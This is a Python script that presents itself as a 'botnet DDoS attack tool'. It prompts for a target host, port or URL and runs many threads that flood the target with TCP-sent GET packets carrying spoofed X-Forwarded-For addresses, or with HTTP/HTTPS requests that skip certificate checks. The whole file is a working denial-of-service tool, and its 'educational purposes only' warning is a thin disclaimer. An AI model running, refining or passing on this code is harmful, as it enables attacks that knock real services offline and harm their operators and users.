import socket
import threading
import time
import random
import sys
import os
from colorama import Fore, Style, init
import requests

init(autoreset=True)

class BotNet:
    def __init__(self):
        self.target = None
        self.port = None
        self.threads = 100
        self.duration = 60
        self.bots = []
        self.attack_mode = 'TCP'  # TCP, HTTP, HTTPS
        self.http_url = None
        
    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.MAGENTA}")
        print("   █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓")
        print(" ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒")
        print(" ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░")
        print(" ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ ")
        print(" ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒")
        print(" ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░")
        print("  ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░")
        print("    ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   ")
        print("     ░       ░           ░  ░         ░             ░            ░   ")
        print(f"{Fore.MAGENTA}                                by Sqrilizz\n")
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                           BOTNET DDoS ATTACK TOOL                          ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")

    def get_user_input(self):
        print(f"{Fore.YELLOW}[*] Select attack mode: [1] TCP (default)  [2] HTTP  [3] HTTPS : ", end="")
        mode = input().strip()
        if mode == '2':
            self.attack_mode = 'HTTP'
        elif mode == '3':
            self.attack_mode = 'HTTPS'
        else:
            self.attack_mode = 'TCP'

        if self.attack_mode == 'TCP':
            print(f"{Fore.YELLOW}[*] Enter target IP/URL: ", end="")
            self.target = input().strip()
            print(f"{Fore.YELLOW}[*] Enter target port (default 80): ", end="")
            port_input = input().strip()
            self.port = int(port_input) if port_input else 80
        else:
            print(f"{Fore.YELLOW}[*] Enter target URL (with http:// or https://): ", end="")
            self.http_url = input().strip()
            if self.attack_mode == 'HTTP' and not self.http_url.startswith('http://'):
                print(f"{Fore.RED}[!] URL must start with http:// for HTTP mode!")
                sys.exit(1)
            if self.attack_mode == 'HTTPS' and not self.http_url.startswith('https://'):
                print(f"{Fore.RED}[!] URL must start with https:// for HTTPS mode!")
                sys.exit(1)

        print(f"{Fore.YELLOW}[*] Enter number of threads (default 100): ", end="")
        threads_input = input().strip()
        self.threads = int(threads_input) if threads_input else 100
        print(f"{Fore.YELLOW}[*] Enter attack duration in seconds (default 60): ", end="")
        duration_input = input().strip()
        self.duration = int(duration_input) if duration_input else 60

    def create_bot(self):
        return {
            'id': random.randint(1000, 9999),
            'status': 'ready',
            'requests_sent': 0,
            'last_activity': time.time()
        }

    def attack_packet(self):
        packet = f"GET / HTTP/1.1\r\n"
        packet += f"Host: {self.target}\r\n"
        packet += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        packet += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        packet += f"Accept-Language: en-US,en;q=0.5\r\n"
        packet += f"Accept-Encoding: gzip, deflate\r\n"
        packet += f"Connection: keep-alive\r\n"
        packet += f"Cache-Control: no-cache\r\n"
        packet += f"Pragma: no-cache\r\n"
        packet += f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
        packet += f"\r\n"
        return packet.encode()

    def bot_attack_tcp(self, bot):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            bot['status'] = 'attacking'
            packet = self.attack_packet()
            while bot['status'] == 'attacking':
                try:
                    sock.send(packet)
                    bot['requests_sent'] += 1
                    bot['last_activity'] = time.time()
                    time.sleep(0.1)
                except:
                    break
        except Exception as e:
            bot['status'] = 'error'
        finally:
            try:
                sock.close()
            except:
                pass

    def bot_attack_http(self, bot):
        bot['status'] = 'attacking'
        headers = {
            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ({random.randint(1000,9999)})',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        while bot['status'] == 'attacking':
            try:
                requests.get(self.http_url, headers=headers, timeout=5, verify=False if self.attack_mode=='HTTPS' else True)
                bot['requests_sent'] += 1
                bot['last_activity'] = time.time()
                time.sleep(0.05)
            except:
                time.sleep(0.1)

    def start_attack(self):
        print(f"{Fore.GREEN}[+] Initializing botnet...")
        for i in range(self.threads):
            bot = self.create_bot()
            self.bots.append(bot)
        print(f"{Fore.GREEN}[+] Created {len(self.bots)} bots")
        if self.attack_mode == 'TCP':
            print(f"{Fore.GREEN}[+] Starting TCP attack on {self.target}:{self.port}")
        else:
            print(f"{Fore.GREEN}[+] Starting {self.attack_mode} attack on {self.http_url}")
        print(f"{Fore.GREEN}[+] Duration: {self.duration} seconds")
        print(f"{Fore.GREEN}[+] Press Ctrl+C to stop\n")
        attack_threads = []
        for bot in self.bots:
            if self.attack_mode == 'TCP':
                thread = threading.Thread(target=self.bot_attack_tcp, args=(bot,))
            else:
                thread = threading.Thread(target=self.bot_attack_http, args=(bot,))
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                active_bots = sum(1 for bot in self.bots if bot['status'] == 'attacking')
                total_requests = sum(bot['requests_sent'] for bot in self.bots)
                print(f"\r{Fore.CYAN}[*] Mode: {self.attack_mode} | Active bots: {active_bots}/{len(self.bots)} | Total requests: {total_requests} | Time left: {int(self.duration - (time.time() - start_time))}s", end="")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack stopped by user")
        for bot in self.bots:
            bot['status'] = 'stopped'
        for thread in attack_threads:
            thread.join(timeout=2)
        total_requests = sum(bot['requests_sent'] for bot in self.bots)
        print(f"\n{Fore.GREEN}[+] Attack completed!")
        print(f"{Fore.GREEN}[+] Total requests sent: {total_requests}")
        print(f"{Fore.GREEN}[+] Average requests per bot: {total_requests // len(self.bots)}")

    def run(self):
        self.print_banner()
        self.get_user_input()
        print(f"\n{Fore.RED}[!] WARNING: This tool is for educational purposes only!")
        print(f"{Fore.RED}[!] Using this tool for illegal activities is your responsibility!")
        print(f"{Fore.YELLOW}[?] Continue? (y/n): ", end="")
        if input().lower() != 'y':
            print(f"{Fore.YELLOW}[!] Attack cancelled")
            return
        self.start_attack()

if __name__ == "__main__":
    try:
        botnet = BotNet()
        botnet.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exiting...")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}")
    input(f"\n{Fore.CYAN}Press Enter to exit...") 